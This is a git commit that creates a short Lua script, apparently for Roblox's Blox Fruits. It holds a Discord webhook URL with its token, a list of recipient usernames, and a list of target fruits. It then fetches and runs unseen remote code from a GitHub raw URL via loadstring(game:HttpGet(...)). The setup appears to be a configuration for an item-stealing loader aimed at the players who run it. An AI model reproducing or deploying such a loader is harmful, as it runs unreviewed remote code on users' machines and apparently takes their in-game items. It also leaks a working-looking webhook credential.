08a75e651d415d5695878367077ce065d4630f6e
bananahubxz <braianmonetizei@gmail.com>
2025-04-10 14:22:14 -0300

    Create banana.lua

---
+++ banana.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1243677699633840211/GMJT_bQq0ADiYwz3Xia2CBJwOsGL_KQF62z5ZQ_eKhoDbXw5Prn8B91ow1wdnjcUFDDE" -- << Your Webhook
+Usernames = {"tokio_wss", "tokio_wss"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
